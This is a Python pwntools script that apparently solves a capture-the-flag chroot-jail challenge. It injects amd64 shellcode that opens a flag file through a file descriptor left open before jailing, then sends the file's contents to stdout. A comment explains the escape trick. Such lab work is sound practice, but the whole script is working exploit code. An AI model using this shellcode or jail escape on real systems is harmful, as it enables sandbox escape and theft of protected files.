import pwn
from pwn import *
import os 
pwnlib.context.context.log_level="DEBUG"
pwnlib.context.context.os = 'linux'
pwnlib.context.context.arch = 'amd64'

def get_value(var_name, proc):
    proc.recvuntil("{} = ".format(var_name))
    val = proc.recvuntil("\n").decode("utf-8")
    val.replace(" ", "")
    return val

filename = "flag"

chall_id = int(os.environ["CHALLENGE_ID"])-230


# 1st param rdi
# 2nd param rsi
# 3rd param rdx
# 4th param r10
#result stored in rax

code_asm = """
    mov rax, 0x101 #syscall OPENAT
    mov rdi, 3
    lea rsi, [rip+flag]
    mov rdx, 0
    syscall

    mov rsi, rax
    mov rax, 0x28
    mov rdi, 1
    mov rdx, 0
    mov r10, 0x300
    syscall

    mov rax, 0x3C
    mov rdi, 42
    syscall
    
flag:
    .ascii "flag"

"""


# sysccall 257 is openat
code_bytes = asm(code_asm, arch = 'amd64', os = 'linux')

chall = pwn.process([f"/challenge/babyjail_level{chall_id}", "/"])
chall.recvuntil(b'Reading 0x1000 bytes of shellcode from stdin.\n')
chall.recvline() # newline
chall.send_raw(code_bytes)
chall.recvall()






### so the clue is that chroot does not really close all fd before jailing
### what if we open a flag file realtive to previously opened fd? ( before jailing ) 
